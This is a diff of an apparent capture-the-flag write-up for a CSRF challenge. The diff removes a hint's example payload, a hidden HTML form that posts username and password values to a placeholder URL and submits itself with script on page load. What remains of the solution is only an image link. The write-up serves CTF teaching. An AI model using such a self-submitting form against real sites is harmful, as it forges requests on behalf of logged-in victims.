@@ -5,18 +5,6 @@ Hint 1: What is CSRF?
 Hint 2: The admin session is inlocalhost, so your payload should perform request to the localhost domain
 Hint 3: Try use the example payload as below:
 
-<html>
-  <body>
-    <form action="URL" method="POST">
-      <input type="hidden" name='username' value='asdf' />
-      <input type="hidden" name='password' value='asdf' />
-      <input type="submit" value="Submit request" />
-    </form>
-    <script>
-      document.forms[0].submit();
-    </script>
-  </body>
-</html>
 
 # Solution
 ![image](https://github.com/user-attachments/assets/077afd8f-f33b-454b-8ef1-ab35291e3cf1)
